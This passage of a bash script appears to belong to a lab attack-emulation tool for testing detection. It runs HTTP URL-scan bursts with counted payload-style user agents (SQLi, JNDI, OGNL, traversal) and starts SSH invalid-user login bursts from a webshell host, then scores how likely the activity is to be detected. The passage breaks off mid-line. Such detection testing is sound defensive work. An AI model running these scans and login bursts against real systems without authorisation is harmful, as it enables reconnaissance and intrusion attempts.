        write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "success" "dry-run"
        save_http_url_scan_overlap_result
        return 0
    fi

    local http_total http_idx=0 http_decision precheck_line precheck_cmd precheck_ec precheck_out classification url t0 t1 elapsed
    local aux_p400 aux_p403 aux_p404 aux_psuccess aux_ptimeout
    local main_401=0 main_405=0 main_500=0 main_real_failed=0 main_synthetic_failed=0 main_redirect_count=0
    local http_concentrated_burst_done=false burst_host="" burst_port="" burst_scheme=""

    if (( HTTP_SCAN_TARGET_COUNT > 0 )) && [[ -n "${main_host}" ]]; then
        burst_host="${main_host}"
        burst_port="${main_port}"
        burst_scheme="${main_scheme}"
        url="${burst_scheme}://${burst_host}:${burst_port}/"
        precheck_line=$(poc_precheck_http "${url}")
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_http_followup "${classification}"; then
            if [[ "${classification}" == http_proto_mismatch ]]; then
                log_message "WARN" "HTTP URL scan precheck http_proto_mismatch for ${url} — selecting failover target"
            fi
            if pick_http_url_scan_failover_target "${candidates}" "${burst_host}" "${burst_port}" "${burst_scheme}" >/dev/null 2>&1; then
                read -r burst_host burst_port burst_scheme <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
                read -r main_host main_port main_scheme <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
                url="${burst_scheme}://${burst_host}:${burst_port}/"
                precheck_line=$(poc_precheck_http "${url}")
                poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
            fi
        fi
        if poc_obs_should_run_http_followup "${classification}"; then
            case "${classification}" in
                http_auth_required) log_http_url_scan_auth_required_continue "${url}" "401" ;;
                http_forbidden|app_forbidden) log_http_url_scan_auth_required_continue "${url}" "403" ;;
                app_unauthorized) log_http_url_scan_auth_required_continue "${url}" "401" ;;
            esac
            log_message "OK" "HTTP URL scan target: host=${burst_host} port=${burst_port} scheme=${burst_scheme} base_url=${url}"
            t0=$(date +%s)
            scan_stats=$(run_http_url_scan_for_target "${burst_host}" "${burst_port}" "${burst_scheme}" | tail -n1)
            t1=$(date +%s)
            elapsed=$((t1 - t0))
            main_burst_elapsed="${elapsed}"
            read -r scheme_out scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success <<< "${scan_stats}"
            sanitize_stats_ints scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success
            main_total="${scan_attempted}"
            main_success="${http_scan_count_200}"
            main_400="${http_scan_count_400}"
            main_401="${http_scan_count_401}"
            main_403="${http_scan_count_403}"
            main_404="${http_scan_count_404}"
            main_405="${http_scan_count_405}"
            main_500="${http_scan_count_500}"
            main_real_failed="${http_scan_real_failed}"
            main_synthetic_failed="${http_scan_synthetic_failed}"
            main_redirect_count="${http_scan_redirect_count}"
            main_timeout="${http_scan_timeout_count}"
            (( main_real_failed == 0 )) && main_real_failed=$((main_400 + main_401 + main_403 + main_404 + main_405 + main_500 + main_timeout))
            (( main_synthetic_failed == 0 && http_scan_count_failed > main_real_failed )) && main_synthetic_failed=$((http_scan_count_failed - main_real_failed))
            (( main_redirect_count == 0 )) && main_redirect_count=$((http_scan_count_301 + http_scan_count_302))
            main_fail_ratio=0
            (( scan_attempted > 0 )) && main_fail_ratio=$((main_real_failed * 100 / scan_attempted))
            unique_attempted_total=$((unique_attempted_total + unique_attempted))
            unique_failed_total=$((unique_failed_total + unique_failed))
            unique_success_total=$((unique_success_total + unique_success))
            attempted_total=$((attempted_total + scan_attempted))
            connected_total=$((connected_total + scan_connected))
            abnormal_total=$((abnormal_total + abnormal_ua))
            rare_total=$((rare_total + rare_ua))
            threat_total=$((threat_total + threat_hunt))
            normal_total=$((normal_total + normal_ua))
            payload_total=$((payload_total + payload_ua))
            sqli_total=$((sqli_total + sqli))
            enc_total=$((enc_total + enc))
            cmd_total=$((cmd_total + cmd))
            trav_total=$((trav_total + trav))
            jndi_total=$((jndi_total + jndi))
            ognl_total=$((ognl_total + ognl))
            spring_total=$((spring_total + spring))
            propfind_total=$((propfind_total + propfind))
            options_total=$((options_total + options))
            post_total=$((post_total + post))
            if [[ "${scheme_out}" == "https" ]]; then
                HTTPS_REQUESTS_ATTEMPTED=$((HTTPS_REQUESTS_ATTEMPTED + scan_attempted))
                HTTPS_RESPONSES_RECEIVED=$((HTTPS_RESPONSES_RECEIVED + scan_responses))
                HTTPS_CONNECTED=$((HTTPS_CONNECTED + scan_connected))
                HTTPS_200_COUNT=$((HTTPS_200_COUNT + http_scan_count_200))
                HTTPS_301_COUNT=$((HTTPS_301_COUNT + http_scan_count_301))
                HTTPS_302_COUNT=$((HTTPS_302_COUNT + http_scan_count_302))
                HTTPS_401_COUNT=$((HTTPS_401_COUNT + http_scan_count_401))
                HTTPS_400_COUNT=$((HTTPS_400_COUNT + http_scan_count_400))
                HTTPS_403_COUNT=$((HTTPS_403_COUNT + http_scan_count_403))
                HTTPS_404_COUNT=$((HTTPS_404_COUNT + http_scan_count_404))
                HTTPS_405_COUNT=$((HTTPS_405_COUNT + http_scan_count_405))
                HTTPS_SCAN_FAILED_RESPONSES=$((HTTPS_SCAN_FAILED_RESPONSES + http_scan_count_failed))
                HTTPS_SCAN_SUCCESS_RESPONSES=$((HTTPS_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
            else
                HTTP_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED + scan_responses))
                HTTP_200_COUNT=$((HTTP_200_COUNT + http_scan_count_200))
                HTTP_301_COUNT=$((HTTP_301_COUNT + http_scan_count_301))
                HTTP_302_COUNT=$((HTTP_302_COUNT + http_scan_count_302))
                HTTP_401_COUNT=$((HTTP_401_COUNT + http_scan_count_401))
                HTTP_400_COUNT=$((HTTP_400_COUNT + http_scan_count_400))
                HTTP_403_COUNT=$((HTTP_403_COUNT + http_scan_count_403))
                HTTP_404_COUNT=$((HTTP_404_COUNT + http_scan_count_404))
                HTTP_405_COUNT=$((HTTP_405_COUNT + http_scan_count_405))
                HTTP_SCAN_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES + http_scan_count_failed))
                HTTP_SCAN_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
            fi
            http_scan_count_timeout="${main_timeout}"
            http_scan_fail_ratio="${main_fail_ratio}"
            state_append "followup_http_capture.log" "host=${burst_host} port=${burst_port} scheme=${scheme_out} mode=main_burst concentrated=1 attempted=${scan_attempted} unique_attempted=${unique_attempted} unique_failed=${unique_failed} unique_success=${unique_success} responses=${scan_responses} real_failed=${main_real_failed} synthetic_failed=${main_synthetic_failed} redirect_count=${main_redirect_count} http_200=${http_scan_count_200} http_400=${http_scan_count_400} http_403=${http_scan_count_403} http_404=${http_scan_count_404} http_405=${http_scan_count_405} http_500=${http_scan_count_500} timeout=${main_timeout} propfind=${propfind} post=${post} options=${options}"
            safe_poc_accumulate_http_scan_status_counts "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_failed}" "${http_scan_count_success}" "${scan_attempted}" "${scan_responses}"
            log_http_url_scan_target_summary "${scheme_out}://${burst_host}:${burst_port}" "${scan_attempted}" "${scan_responses}" \
                "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_400}" "${http_scan_count_401}" \
                "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_500}" "${main_timeout}" \
                "${main_real_failed}" "${http_scan_count_success}" "${http_scan_fail_ratio}" || true
            local http_attempt_ok=false
            poc_http_followup_attempt_ok "${scan_responses}" "${scan_connected}" "${http_scan_count_success}" "${scan_attempted}" && http_attempt_ok=true
            http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${burst_host}" "${burst_port}" "open" "${scheme_out}" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
                "${http_attempt_ok}" "run_http_url_scan_for_target ${burst_scheme}://${burst_host}:${burst_port}" "${WEBSHELL_LAST_EXIT_CODE:-0}" "${elapsed}")
            poc_obs_log "EVIDENCE" "HTTP follow-up ${burst_host}:${burst_port} decision=${http_decision} responses=${scan_responses} mode=main_burst"
            http_concentrated_burst_done=true
        else
            log_message "WARN" "HTTP URL scan concentrated target precheck failed for ${url} classification=${classification} — no failover target available"
        fi
    fi

    http_total=$(printf '%s\n' "${candidates}" | awk 'NF{c++} END{print c+0}')
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        [[ -z "${host}" ]] && continue
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
        http_idx=$((http_idx + 1))
        poc_obs_log "INFO" "HTTP Follow-up Progress: ${http_idx}/${http_total} targets processed"
        url="${scheme}://${host}:${port}/"
        if [[ "${host}" == "${main_host}" && "${port}" == "${main_port}" && "${scheme}" == "${main_scheme}" && "${http_concentrated_burst_done}" == true ]]; then
            http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                "${precheck_cmd:-auxiliary_probe_only}" "0" "concentrated_burst_complete" "connected" false false \
                "concentrated_burst_already_executed" "0" "${main_total}")
            poc_obs_log "EVIDENCE" "HTTP follow-up ${host}:${port} decision=${http_decision} mode=concentrated_burst_done"
            continue
        fi
        if [[ "${host}" != "${main_host}" || "${port}" != "${main_port}" || "${scheme}" != "${main_scheme}" ]]; then
            if read -r aux_p400 aux_p403 aux_p404 aux_psuccess aux_ptimeout <<< "$(lookup_http_url_scan_probe_cache "${host}" "${port}" "${scheme}")"; then
                state_append "followup_http_capture.log" "host=${host} port=${port} scheme=${scheme} mode=auxiliary_probe probe_400=${aux_p400} probe_403=${aux_p403} probe_404=${aux_p404} probe_success=${aux_psuccess} probe_timeout=${aux_ptimeout}"
            fi
            http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                "auxiliary_probe_only" "0" "selection_probe_only" "connected" false false \
                "auxiliary_probe_only (no main burst)" "0" "0")
            poc_obs_log "EVIDENCE" "HTTP follow-up ${host}:${port} decision=${http_decision} mode=auxiliary_probe_only"
            continue
        fi
        precheck_line=$(poc_precheck_http "${url}")
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_http_followup "${classification}"; then
            if pick_http_url_scan_failover_target "${candidates}" "${host}" "${port}" "${scheme}" >/dev/null 2>&1; then
                read -r host port scheme <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
                url="${scheme}://${host}:${port}/"
                precheck_line=$(poc_precheck_http "${url}")
                poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
                if ! poc_obs_should_run_http_followup "${classification}"; then
                    http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                        "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
                    log_message "WARN" "HTTP URL scan skipped for ${host}:${port} decision=${http_decision} classification=${classification} (failover exhausted)"
                    continue
                fi
                log_message "OK" "HTTP URL scan failover burst target=${url} classification=${classification}"
            else
                http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                    "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
                log_message "WARN" "HTTP URL scan skipped for ${host}:${port} decision=${http_decision} classification=${classification}"
                continue
            fi
        fi
        case "${classification}" in
            http_auth_required) log_http_url_scan_auth_required_continue "${url}" "401" ;;
            http_forbidden|app_forbidden) log_http_url_scan_auth_required_continue "${url}" "403" ;;
            app_unauthorized) log_http_url_scan_auth_required_continue "${url}" "401" ;;
        esac
        t0=$(date +%s)
        scan_stats=$(run_http_url_scan_for_target "${host}" "${port}" "${scheme}" | tail -n1)
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        main_burst_elapsed="${elapsed}"
        read -r scheme_out scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
            http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
            http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
            propfind options post unique_attempted unique_failed unique_success <<< "${scan_stats}"
        sanitize_stats_ints scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
            http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
            http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
            propfind options post unique_attempted unique_failed unique_success
        main_total="${scan_attempted}"
        main_success="${http_scan_count_200}"
        main_400="${http_scan_count_400}"
        main_401="${http_scan_count_401}"
        main_403="${http_scan_count_403}"
        main_404="${http_scan_count_404}"
        main_405="${http_scan_count_405}"
        main_500="${http_scan_count_500}"
        main_real_failed="${http_scan_real_failed}"
        main_synthetic_failed="${http_scan_synthetic_failed}"
        main_redirect_count="${http_scan_redirect_count}"
        main_timeout="${http_scan_timeout_count}"
        (( main_real_failed == 0 )) && main_real_failed=$((main_400 + main_401 + main_403 + main_404 + main_405 + main_500 + main_timeout))
        (( main_synthetic_failed == 0 && http_scan_count_failed > main_real_failed )) && main_synthetic_failed=$((http_scan_count_failed - main_real_failed))
        (( main_redirect_count == 0 )) && main_redirect_count=$((http_scan_count_301 + http_scan_count_302))
        main_fail_ratio=0
        (( scan_attempted > 0 )) && main_fail_ratio=$((main_real_failed * 100 / scan_attempted))
        unique_attempted_total=$((unique_attempted_total + unique_attempted))
        unique_failed_total=$((unique_failed_total + unique_failed))
        unique_success_total=$((unique_success_total + unique_success))
        attempted_total=$((attempted_total + scan_attempted))
        connected_total=$((connected_total + scan_connected))
        abnormal_total=$((abnormal_total + abnormal_ua))
        rare_total=$((rare_total + rare_ua))
        threat_total=$((threat_total + threat_hunt))
        normal_total=$((normal_total + normal_ua))
        payload_total=$((payload_total + payload_ua))
        sqli_total=$((sqli_total + sqli))
        enc_total=$((enc_total + enc))
        cmd_total=$((cmd_total + cmd))
        trav_total=$((trav_total + trav))
        jndi_total=$((jndi_total + jndi))
        ognl_total=$((ognl_total + ognl))
        spring_total=$((spring_total + spring))
        propfind_total=$((propfind_total + propfind))
        options_total=$((options_total + options))
        post_total=$((post_total + post))
        if [[ "${scheme_out}" == "https" ]]; then
            HTTPS_REQUESTS_ATTEMPTED=$((HTTPS_REQUESTS_ATTEMPTED + scan_attempted))
            HTTPS_RESPONSES_RECEIVED=$((HTTPS_RESPONSES_RECEIVED + scan_responses))
            HTTPS_CONNECTED=$((HTTPS_CONNECTED + scan_connected))
            HTTPS_200_COUNT=$((HTTPS_200_COUNT + http_scan_count_200))
            HTTPS_301_COUNT=$((HTTPS_301_COUNT + http_scan_count_301))
            HTTPS_302_COUNT=$((HTTPS_302_COUNT + http_scan_count_302))
            HTTPS_401_COUNT=$((HTTPS_401_COUNT + http_scan_count_401))
            HTTPS_400_COUNT=$((HTTPS_400_COUNT + http_scan_count_400))
            HTTPS_403_COUNT=$((HTTPS_403_COUNT + http_scan_count_403))
            HTTPS_404_COUNT=$((HTTPS_404_COUNT + http_scan_count_404))
            HTTPS_405_COUNT=$((HTTPS_405_COUNT + http_scan_count_405))
            HTTPS_SCAN_FAILED_RESPONSES=$((HTTPS_SCAN_FAILED_RESPONSES + http_scan_count_failed))
            HTTPS_SCAN_SUCCESS_RESPONSES=$((HTTPS_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
        else
            HTTP_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED + scan_responses))
            HTTP_200_COUNT=$((HTTP_200_COUNT + http_scan_count_200))
            HTTP_301_COUNT=$((HTTP_301_COUNT + http_scan_count_301))
            HTTP_302_COUNT=$((HTTP_302_COUNT + http_scan_count_302))
            HTTP_401_COUNT=$((HTTP_401_COUNT + http_scan_count_401))
            HTTP_400_COUNT=$((HTTP_400_COUNT + http_scan_count_400))
            HTTP_403_COUNT=$((HTTP_403_COUNT + http_scan_count_403))
            HTTP_404_COUNT=$((HTTP_404_COUNT + http_scan_count_404))
            HTTP_405_COUNT=$((HTTP_405_COUNT + http_scan_count_405))
            HTTP_SCAN_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES + http_scan_count_failed))
            HTTP_SCAN_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
        fi
        http_scan_count_timeout="${main_timeout}"
        http_scan_fail_ratio="${main_fail_ratio}"
        state_append "followup_http_capture.log" "host=${host} port=${port} scheme=${scheme_out} mode=main_burst attempted=${scan_attempted} unique_attempted=${unique_attempted} unique_failed=${unique_failed} unique_success=${unique_success} responses=${scan_responses} real_failed=${main_real_failed} synthetic_failed=${main_synthetic_failed} redirect_count=${main_redirect_count} http_200=${http_scan_count_200} http_400=${http_scan_count_400} http_403=${http_scan_count_403} http_404=${http_scan_count_404} http_405=${http_scan_count_405} http_500=${http_scan_count_500} timeout=${main_timeout} propfind=${propfind} post=${post} options=${options}"
        safe_poc_accumulate_http_scan_status_counts "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_failed}" "${http_scan_count_success}" "${scan_attempted}" "${scan_responses}"
        log_http_url_scan_target_summary "${scheme_out}://${host}:${port}" "${scan_attempted}" "${scan_responses}" \
            "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_400}" "${http_scan_count_401}" \
            "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_500}" "${main_timeout}" \
            "${main_real_failed}" "${http_scan_count_success}" "${http_scan_fail_ratio}" || true
        local http_attempt_ok=false
        poc_http_followup_attempt_ok "${scan_responses}" "${scan_connected}" "${http_scan_count_success}" "${scan_attempted}" && http_attempt_ok=true
        http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme_out}" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
            "${http_attempt_ok}" "run_http_url_scan_for_target ${scheme}://${host}:${port}" "${WEBSHELL_LAST_EXIT_CODE:-0}" "${elapsed}")
        poc_obs_log "EVIDENCE" "HTTP follow-up ${host}:${port} decision=${http_decision} responses=${scan_responses} mode=main_burst"
    done <<< "${candidates}"
    poc_obs_stage_end "HTTP Follow-up"

    HTTP_REQUESTS_ATTEMPTED="${attempted_total}"
    HTTP_CONNECTED="${connected_total}"
    ABNORMAL_USER_AGENT_COUNT="${abnormal_total}"
    RARE_USER_AGENT_COUNT="${rare_total}"
    NORMAL_USER_AGENT_COUNT="${normal_total}"
    PAYLOAD_USER_AGENT_COUNT="${payload_total}"
    UA_SQLI_STYLE_COUNT="${sqli_total}"
    UA_ENCODING_ABUSE_COUNT="${enc_total}"
    UA_COMMAND_STYLE_COUNT="${cmd_total}"
    UA_TRAVERSAL_STYLE_COUNT="${trav_total}"
    UA_JNDI_STYLE_COUNT="${jndi_total}"
    UA_OGNL_STYLE_COUNT="${ognl_total}"
    UA_SPRING_STYLE_COUNT="${spring_total}"
    THREAT_HUNT_URL_REQUESTS="${threat_total}"
    HTTP_PROPFIND_COUNT="${propfind_total}"
    HTTP_OPTIONS_COUNT="${options_total}"
    HTTP_POST_COUNT="${post_total}"
    URL_SCAN_UNIQUE_ATTEMPTED="${unique_attempted_total}"
    URL_SCAN_UNIQUE_FAILED="${unique_failed_total}"
    URL_SCAN_UNIQUE_SUCCESS="${unique_success_total}"
    sync_url_scan_unique_metrics
    reconcile_http_scan_status_metrics
    sync_http_scan_fail_ratio
    sync_web_combined_metrics

    if (( main_total > 0 )); then
        log_http_url_scan_final_summary "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${main_total}" \
            "${main_success}" "${main_real_failed}" "${main_synthetic_failed}" "${main_redirect_count}" \
            "${main_400}" "${main_401}" "${main_403}" "${main_404}" "${main_405}" "${main_500}" "${main_timeout}"
    fi
    compute_http_ua_detection_likelihoods
    log_http_ua_coverage_aggregate
    if (( main_total > 0 )); then
        log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS}}" summary
    fi
    compute_web_detection_confidence
    sync_http_followup_counter_aliases
    followup_record_http "${attempted_total}"

    check_http_ua_coverage_warn
    poc_obs_log "SUMMARY" "HTTP URL Scan stage finished — planned=${HTTP_REQUESTS_PLANNED} attempted=${HTTP_REQUESTS_ATTEMPTED} unique_attempted=${URL_SCAN_UNIQUE_ATTEMPTED} unique_failed=${URL_SCAN_UNIQUE_FAILED} web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE} detection_likelihood_url_scan=${DETECTION_LIKELIHOOD_URL_SCAN:-low} detection_likelihood_malicious_ua=${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low} ua_coverage=${HTTP_UA_COVERAGE_PRESENT:-0}/${HTTP_UA_COVERAGE_TOTAL:-0}"
    poc_obs_log "EVIDENCE" "$(format_http_status_breakdown_block | tr '\n' ' ')"
    poc_obs_log "EVIDENCE" "$(format_http_method_breakdown_block | tr '\n' ' ')"
    poc_obs_log "EVIDENCE" "$(format_http_attack_summary_block | tr '\n' ' ')"
    log_message "OK" "$(format_url_scan_stellar_model_block)"
    log_message "OK" "$(format_http_attack_summary_block)"

    if (( HTTP_REQUESTS_ATTEMPTED == 0 )); then
        http_stage_status="Failed"
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        http_stage_detail="URL-SCAN EXECUTION FAILURE — selected_targets=${HTTP_SCAN_TARGET_COUNT} attempted=0"
        log_message "ERROR" "${http_stage_detail}"
    elif ! web_url_scan_successful; then
        http_stage_status="Failed"
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        if (( WEB_RESPONSES_RECEIVED == 0 )); then
            http_stage_detail="URL-SCAN RESPONSE FAILURE — no web responses received"
            log_message "ERROR" "${http_stage_detail}"
        else
            http_stage_detail="insufficient External URL Recon telemetry (need unique_failed>=${HTTP_SCAN_RECON_MIN_FAILED:-30} fail_ratio>=${HTTP_SCAN_RECON_MIN_FAIL_RATIO:-90}%; got unique_failed=${URL_SCAN_UNIQUE_FAILED} unique_attempted=${URL_SCAN_UNIQUE_ATTEMPTED} ratio=${URL_SCAN_UNIQUE_FAIL_RATIO}%; 400/403/404/405=$((HTTP_400_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_400_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT)))"
            if [[ "${POC_INTENSITY}" == high || "${POC_INTENSITY}" == spike || "${STRICT_FOLLOWUP_VALIDATION}" == true ]]; then
                log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — ${http_stage_detail}"
            else
                http_stage_status="Partial"
                HTTP_URL_SCAN_STAGE_STATUS="warn"
                log_message "WARN" "URL Scan quality below threshold (non-fatal for ${POC_INTENSITY} intensity)"
            fi
        fi
    else
        HTTP_URL_SCAN_STAGE_STATUS="success"
        http_stage_detail="targets=1 selected=${HTTP_URL_SCAN_SELECTED_TARGET:-none} web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE} detection_likelihood=${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    fi
    log_detection_quality "HTTP URL Scan" "${HTTP_REQUESTS_ATTEMPTED:-0}" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS:-0}}" \
        "${HTTP_URL_SCAN_SELECTED_TARGET:-1}" "${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}" \
        "${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}" "${HTTP_URL_SCAN_FINAL_REASON:-burst_complete}"
    compute_detection_score_http_url_scan "${HTTP_REQUESTS_ATTEMPTED:-0}" "${HTTP_URL_SCAN_REAL_FAILED:-0}" "1" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS:-0}}"
    set_stage_result "HTTP/HTTPS Follow-up" "${http_stage_status}" "${http_stage_detail}"
    write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "$([[ "${http_stage_status}" == Success ]] && printf success || printf partial)" \
        "web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE}"
    save_http_url_scan_overlap_result
    if [[ "${http_stage_status}" == "Failed" ]]; then
        return 1
    fi
    return 0
}

stage_ssh_auth_burst() {
    local targets attempts concurrency minutes planned executed=0 observed_total=0 host_count
    local target n ssh_idx=0 ssh_total precheck_line precheck_cmd precheck_ec precheck_out classification ssh_decision t0 t1 elapsed

    poc_obs_stage_start "SSH Follow-up"
    targets=$(collect_ssh_burst_targets)
    if [[ -z "${targets}" ]]; then
        poc_obs_record_followup "SSH Login Simulation" "n/a" "22" "not_found" "ssh" "n/a" "0" "no SSH targets" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "SSH Auth Burst" "No SSH targets (discovery empty and no --ssh-target)"
        set_stage_result "SSH Auth Burst" "Skipped" "no SSH targets (decision=skipped_config_missing)"
        poc_obs_stage_end "SSH Follow-up"
        return 0
    fi

    SSH_AUTH_BURST_ENABLED=true
    attempts="${SSH_BURST_ATTEMPTS}"
    concurrency="${SSH_BURST_CONCURRENCY}"
    minutes="${SSH_BURST_MINUTES}"
    host_count=$(count_hosts_blob "${targets}")
    planned=$((host_count * attempts))
    SSH_ATTEMPTS_PLANNED="${planned}"
    SSH_AUTH_ATTEMPTED="${planned}"

    log_message "OK" "SSH auth burst: ${host_count} target(s), ${attempts} invalid-user attempts/host (from webshell host)"
    add_executed_stage "SSH Auth Burst"
    write_report_entries "ssh_auth_burst" "T1110.001" "EDR/SIEM" "SSH Auth Failure Burst" "multi" "start" "invalid-user auth telemetry (no credentials)"

    ssh_total=$(count_hosts_blob "${targets}")
    if [[ "${DRY_RUN}" == true ]]; then
        while IFS= read -r target; do
            [[ -z "${target}" ]] && continue
            ssh_idx=$((ssh_idx + 1))
            poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
            precheck_line=$(poc_precheck_ssh "${target}" 22)
            poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
            poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
                "ssh invalid-user auth burst (dry-run)" "0" "0" >/dev/null
        done <<< "${targets}"
        SSH_ATTEMPTS_EXECUTED="${planned}"
        SSH_AUTH_FAILURES_OBSERVED="${planned}"
        followup_record_ssh "${planned}"
        poc_obs_stage_end "SSH Follow-up"
        set_stage_result "SSH Auth Burst" "Success" "dry-run planned ${planned} attempts"
        return 0
    fi

    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        pipeline_stop_requested && break
        validate_ssh_target_in_lab "${target}" "SSH burst target" false || continue
        ssh_idx=$((ssh_idx + 1))
        poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
        precheck_line=$(poc_precheck_ssh "${target}" 22)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SSH auth burst skipped for ${target}:22 decision=${ssh_decision}"
            continue
        fi
        t0=$(date +%s)
        if [[ "${minutes}" =~ ^[0-9]+$ && "${minutes}" -gt 0 ]]; then
            n=$(run_webshell_long "ssh-auth-burst-duration-${target}" \
